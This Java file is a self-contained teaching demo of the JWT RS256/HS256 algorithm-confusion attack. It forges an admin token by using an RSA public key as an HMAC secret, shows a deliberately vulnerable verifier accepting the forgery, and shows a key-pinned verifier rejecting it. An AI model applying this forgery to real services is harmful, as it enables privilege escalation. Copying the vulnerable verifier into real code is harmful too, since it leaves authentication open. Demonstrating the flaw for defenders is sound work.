package com.backendplan.security.advanced;

import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;
import io.jsonwebtoken.security.SignatureException;

import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.Base64;
import java.util.Date;

// The RS256/HS256 "algorithm confusion" attack: an attacker who knows a service's PUBLIC RS256
// key (public by design - it's meant to be shared) reuses those same bytes as the SECRET for an
// HS256-signed forged token. A verifier that blindly trusts the token's own declared algorithm
// will accept it. A verifier that pins the expected algorithm rejects it outright.
public class AlgorithmConfusionAttackDemo {

    public static void main(String[] args) throws Exception {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        KeyPair keyPair = generator.generateKeyPair();
        RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();
        RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();

        String legitimateToken = Jwts.builder()
                .subject("uttam")
                .claim("role", "user")
                .expiration(new Date(System.currentTimeMillis() + 60_000))
                .signWith(privateKey)
                .compact();
        System.out.println("Legitimate RS256 token (signed with the PRIVATE key): " + legitimateToken);

        System.out.println();
        System.out.println("--- Attacker forges a token using the PUBLIC key as an HMAC secret ---");
        // the public key is, by design, known to anyone - that's what makes this attack possible
        byte[] publicKeyBytes = publicKey.getEncoded();
        SecretKey forgedHmacKey = new SecretKeySpec(publicKeyBytes, "HmacSHA256");
        String forgedToken = Jwts.builder()
                .subject("attacker")
                .claim("role", "admin") // privilege escalation
                .expiration(new Date(System.currentTimeMillis() + 60_000))
                .signWith(forgedHmacKey, Jwts.SIG.HS256)
                .compact();
        System.out.println("Forged HS256 token: " + forgedToken);

        System.out.println();
        System.out.println("--- Vulnerable verifier: trusts whatever key type matches the token's own algorithm ---");
        try {
            SecretKey verifierTreatsPublicKeyAsHmacSecret = new SecretKeySpec(publicKeyBytes, "HmacSHA256");
            var claims = Jwts.parser().verifyWith(verifierTreatsPublicKeyAsHmacSecret).build()
                    .parseSignedClaims(forgedToken).getPayload();
            System.out.println("ACCEPTED forged token! subject=" + claims.getSubject() + ", role=" + claims.get("role"));
            System.out.println("This is the vulnerability: an attacker just became admin.");
        } catch (SignatureException e) {
            System.out.println("Rejected (unexpected for the vulnerable path): " + e.getMessage());
        }

        System.out.println();
        System.out.println("--- Safe verifier: only ever verifies with the RSA public key via verifyWith(PublicKey) ---");
        try {
            Jwts.parser().verifyWith(publicKey).build().parseSignedClaims(forgedToken);
            System.out.println("This should not print - the forged token uses the wrong algorithm entirely.");
        } catch (Exception e) {
            System.out.println("Correctly REJECTED: " + e.getClass().getSimpleName()
                    + " - an RSA-key verifier cannot be tricked into accepting an HMAC-signed token.");
        }
    }
}
